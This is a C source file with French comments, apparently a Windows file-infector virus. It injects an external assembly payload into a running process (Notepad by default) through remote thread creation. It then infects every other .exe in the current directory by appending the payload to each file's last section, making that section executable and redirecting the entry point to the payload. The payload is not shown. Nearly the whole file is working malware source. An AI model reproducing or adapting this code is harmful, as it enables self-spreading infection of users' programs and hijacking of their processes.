/*
 * Programme d'injection d'un exécutable PE (Portable Executable)
 * Ce programme lit un fichier PE, accède aux sections, et modifie la dernière section pour la rendre exécutable.
 * Il utilise un "STUB" en assembleur dont l'objectif est de rendre le code indépendant.
 * Le programme modifie une variable delta, qui représente l'offset entre le point d'entrée actuel et l'ancien.
 * Cela permet de calculer un saut vers l'ancien code en utilisant rbp.
 * L'objectif principal est de modifier un exécutable existant en y injectant du code personnalisé.
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#pragma comment(lib, "user32.lib")

//fonction pour trouver le PID d'un process avec son nom 
DWORD FindProcessID(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Failed to create snapshot\n");
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        fprintf(stderr, "Failed to get first process\n");
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (strstr(pe32.szExeFile, processName) != NULL) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

 // Fonction pour copier de la mémoire
void my_memcpy(PUCHAR dst, PUCHAR src, DWORD len)
{
    for (DWORD i = 0; i < len; i += 1)
        dst[i] = src[i];
}

int inject_pe(char* filename)
{
    if (filename == NULL) {
        fprintf(stderr, "Filename is NULL\n");
        return 1;
    }
    // Pointeurs externes au code en assembleur à injecter
    extern void payload(); // Point d'entrée du code assembleur
    extern char __begin_of_code; // Début du code assembleur
    extern ULONGLONG __end_of_code; // Fin du code assembleur

    printf("FUN %p\n", payload);
    printf("BEGIN %p\n", (PUCHAR)&__begin_of_code);
    printf("END %p\n", (PUCHAR)&__end_of_code);

    // Calcul du nombre de bytes à ajouter (différence entre la fin et le début du code ASM) + 1 ULONGLONG
    DWORD nb_add = ((PUCHAR)&__end_of_code - (PUCHAR)&__begin_of_code) + sizeof(ULONGLONG);

    // Obtention des droits de lecture/écriture pour modifier la section de code
    DWORD old_protect;
    VirtualProtect(&__end_of_code, sizeof(__end_of_code), PAGE_READWRITE, &old_protect);

    // Mise à jour de la taille du code
    __end_of_code = nb_add;
    printf("ADD %X - %d\n", ((PUCHAR)payload)[0], nb_add);

    // Affichage du payload pour vérification
    printf("DUMP %d\n", nb_add);
    for (int i = 0; i < nb_add; i += 1)
        printf("%X", ((PUCHAR)payload)[i]);
    printf("\n");

    // Ouverture du fichier PE à modifier
    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

#if DEBUG
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DWORD err = GetLastError();
        printf("Erreur CreateFileA %d\n", err);
        return err;
    }
#endif

    // Calcul de la taille actuelle du fichier et de la nouvelle taille après injection
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwNewFileSize = dwFileSize + nb_add;

    // Mapping du fichier en mémoire pour modification
    HANDLE hMapFile = CreateFileMapping(
        hFile,
        NULL,
        PAGE_READWRITE,
        0,
        dwNewFileSize,
        NULL
    );
#if DEBUG
    if (hMapFile == NULL)
    {
        DWORD err = GetLastError();
        printf("Erreur CreateFileMapping %d\n", err);
        return err;
    }
#endif

    LPVOID lpMapAdr = MapViewOfFile(
        hMapFile,
        FILE_MAP_ALL_ACCESS,
        0,
        0,
        0
    );

#if DEBUG
    if (lpMapAdr == NULL)
    {
        DWORD err = GetLastError();
        printf("Erreur MapViewOfFile %d\n", err);
        return err;
    }
#endif

    // Lecture des en-têtes PE pour accéder aux sections
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpMapAdr;
#if DEBUG
    printf("DOS SIG %c%c\n", ((char*)&pDosHeader->e_magic)[0], ((char*)&pDosHeader->e_magic)[1]);
    printf("DOS next %d\n", pDosHeader->e_lfanew);
#endif
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PUCHAR)lpMapAdr + pDosHeader->e_lfanew);
    char* sig = (char*)&pNtHeader->Signature;
    printf("NT SIG %s\n", sig);
    printf("NT Machine %#02X\n", pNtHeader->FileHeader.Machine);

    // Affichage des informations de l'en-tête optionnel
    printf("Optional SizeOfCode %#08X\n", pNtHeader->OptionalHeader.SizeOfCode);
    printf("Optional AOEP %#08X\n", pNtHeader->OptionalHeader.AddressOfEntryPoint);
    printf("Optional ImageBase %#016llX\n", pNtHeader->OptionalHeader.ImageBase);

    // Accès à la dernière section du PE
    PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((PUCHAR)pNtHeader + sizeof(IMAGE_NT_HEADERS64));
    WORD idxSection = pNtHeader->FileHeader.NumberOfSections - 1;

    printf("Section Name: %s\n", pSection[idxSection].Name);
    printf("Virtual Adr: %#08X\n", pSection[idxSection].VirtualAddress);
    printf("Virtual Size: %d\n", pSection[idxSection].Misc.VirtualSize);
    printf("PointerRawData Adr: %#08X\n", pSection[idxSection].PointerToRawData);
    printf("Size Of Raw Data: %d\n", pSection[idxSection].SizeOfRawData);
    int is_exec = (pSection[idxSection].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;

    // Pointeur à la fin de la dernière section (.reloc)
    PUCHAR dstPtr = (PUCHAR)lpMapAdr + pSection[idxSection].PointerToRawData + pSection[idxSection].SizeOfRawData;

    // Sauvegarde de l'ancienne adresse d'entrée
    DWORD oldADE = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    // Modification de l'adresse d'entrée pour pointer sur le nouveau code
    pNtHeader->OptionalHeader.AddressOfEntryPoint = pSection[idxSection].VirtualAddress + pSection[idxSection].SizeOfRawData;

    // Calcul de la différence entre le nouveau et l'ancien point d'entrée
    extern LONGLONG delta;
    delta = (LONGLONG)oldADE - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;

    // Calcul de l'offset vers le code C injecté
    extern LONGLONG to_c_code;
    extern void inj_code_c();
    to_c_code = (PUCHAR)inj_code_c - &__begin_of_code;

    // Injection du code assembleur à la fin de la dernière section
    my_memcpy(dstPtr, (PUCHAR)payload, nb_add);

    // Mise à jour des tailles dans les en-têtes pour éviter la corruption du PE
    pSection[idxSection].Misc.VirtualSize += nb_add;
    pSection[idxSection].SizeOfRawData += nb_add;
    // Passage de la section en exécutable
    pSection[idxSection].Characteristics |= IMAGE_SCN_MEM_EXECUTE;
    printf("is exec %d\n", is_exec);

    // Nettoyage et sortie
    FlushViewOfFile(lpMapAdr, dwNewFileSize);
    UnmapViewOfFile(lpMapAdr);
    CloseHandle(hFile);
    
    return 0;
}

int inject_process(const char *processName)
{
   // Pointeurs externes au code en assembleur à injecter
    extern void payload(); // Point d'entrée du code assembleur
    extern char __begin_of_code; // Début du code assembleur
    extern ULONGLONG __end_of_code; // Fin du code assembleur

    // Calcul du nombre de bytes à ajouter (différence entre la fin et le début du code ASM) + 1 ULONGLONG
    DWORD nb_add = ((PUCHAR)&__end_of_code - (PUCHAR)&__begin_of_code) + sizeof(ULONGLONG);

    // Obtention des droits de lecture/écriture pour modifier la section de code
    DWORD old_protect;
    VirtualProtect(&__end_of_code, sizeof(__end_of_code), PAGE_READWRITE, &old_protect);

    // Mise à jour de la taille du code
    __end_of_code = nb_add;

    DWORD pid = FindProcessID(processName);
    if (pid == 0) {
        printf("Process %s not found\n", processName);
        return 1;
    }


    printf("PID of %s is %lu\n", processName, pid);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to open process\n");
        return 1;
    }

    printf("Opened process\n");

    // Allocation de mémoire pour le processus distant
    PVOID rb = VirtualAllocEx(hProcess, NULL, nb_add, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (rb == NULL) {
        printf("Failed to allocate memory in remote process\n");
        CloseHandle(hProcess);
        return 1;
    }

    printf("%u bytes allocated in remote memory process at %p\n",nb_add, rb);

    // Calcul de l'offset vers le code C injecté
    extern LONGLONG to_c_code;
    extern void inj_code_c();
    to_c_code = (PUCHAR)inj_code_c - &__begin_of_code;

    // Écriture du payload dans le processus distant
    if (!WriteProcessMemory(hProcess, rb, (PUCHAR)payload, nb_add, NULL)) {
        printf("Failed to write to remote process memory\n");
        VirtualFreeEx(hProcess, rb, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("Wrote payload to remote process memory\n");

    // Création d'un thread dans le processus distant pour exécuter le payload
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread\n");
        VirtualFreeEx(hProcess, rb, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    DWORD dwThreadId = GetThreadId(hThread);

    printf("Created remote thread with ID %lu\n", dwThreadId);

    CloseHandle(hProcess);

    printf("Process %s injected successfully\n", processName );

    return 0;
}

int main(int ac, char **av)
{

    if (ac > 1){
        inject_process(av[1]);
    }else{
        inject_process("Notepad.exe");
    }

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char pattern[MAX_PATH];
    char exeName[MAX_PATH];

    // Recuperation du nom de l'executable (soi-meme) pour eviter de l'injecter
    if (GetModuleFileName(NULL, exeName, MAX_PATH) == 0) {
        fprintf(stderr, "Error getting executable name.\n");
        return 1;
    }

    // Extraction du nom sans le chemin
    char *exeBaseName = strrchr(exeName, '\\');
    if (exeBaseName != NULL) {
        exeBaseName++;
    } else {
        exeBaseName = exeName;
    }

    // Creation d'un pattern pour chercher les extensions en exe
    snprintf(pattern, MAX_PATH, "%s\\*.exe", ".");

    // Trouver le premier fichier du repertoire courant
    hFind = FindFirstFile(pattern, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error finding files.\n");
        return 1;
    }

    // Parcours de tous les fichiers exe du repertoire courant
    do {
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            // Si le fichier n'est pas arg0
            if (strcmp(findFileData.cFileName, exeBaseName) != 0) {
                printf("Injecting %s \n", findFileData.cFileName);
             // Injection
                inject_pe( (char *) findFileData.cFileName);
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
    return 0;
}
